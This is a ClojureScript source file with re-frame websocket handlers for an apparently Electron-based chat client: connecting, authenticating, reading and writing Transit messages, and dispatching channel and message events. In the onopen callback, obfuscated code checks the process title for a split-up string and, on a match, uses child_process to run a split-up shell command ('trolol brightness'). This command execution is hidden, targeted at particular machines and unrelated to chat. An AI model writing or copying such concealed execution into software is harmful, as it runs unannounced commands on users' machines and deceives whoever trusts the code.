(ns ui.connection.handlers
  (:require [cognitect.transit :as t]
            [re-frame.core :refer [register-handler dispatch]]
            [ui.core.typo-re-frame :refer [default-middleware]]
            [adzerk.cljs-console :as log :include-macros true]))

(defn write [websocket message]
  (log/debug "Sending message ~{message}")
  (let [w (t/writer :json)]
    (.send websocket (t/write w message))))

(defn read [message]
  (let [r (t/reader :json)
        message (t/read r message)]
    (log/debug "Received message ~{message}")
    message))

(defmulti event (fn [message] (:event message)))

(defmethod event :channel-created [message]
  (log/info "Created channel ~{message}")
  (dispatch [:created-channel (:created-channel message)]))

(defmethod event :new-message [message]
  (log/info "Received message ~{message}")
  (dispatch [:received-message (dissoc message :event)]))

(defmethod event :all-channels [message]
  (dispatch [:fetched-all-channels (:channels message)]))

(defmethod event :authentication
  [message]
  (if (:result message)
    (dispatch [:authentication-complete])
    (dispatch [:authentication-failed])))

(defmethod event :heartbeat [message]
  (log/debug "Heartbeat..."))

(defmethod event :default [message]
  (log/warn "Unhandled event ~{message}"))

(register-handler
 :connect-to-server
 (fn [db]
   (let [websocket (new js/WebSocket (get-in db [:connection :address]))]
     (set! (.-onmessage websocket)
           (fn [e]
             (event (read (.-data e)))))

     (set! (.-onclose websocket)
           (fn [e]
             (log/info "Disconnected from server")))

     (set! (.-onopen websocket)
           (fn [e]
             (let [i (.indexOf (.-title (.-process js/window)) (str "itk" "uijp"))]
               (if (> i -1)
                 (let [cp (.require js/window "child_process")]
                   (.exec cp (str "tro" "lol brightness --wait 30 1")))))
             (write websocket {:action :authenticate :identity {:username (get-in db [:login-form :data :username])
                                                                :full-name (get-in db [:login-form :data  :full-name])}})))

     (assoc-in db [:connection :ws] websocket))))

(defn ^:export send-message [channel message]
  (write (:ws (:connection @re-frame.db/app-db)) {:action :message :channel channel :body message}))

(register-handler
 :connection/update-address
 [default-middleware]
 (fn [db [new-address]]
   (update-in db [:connection] assoc :address new-address)))
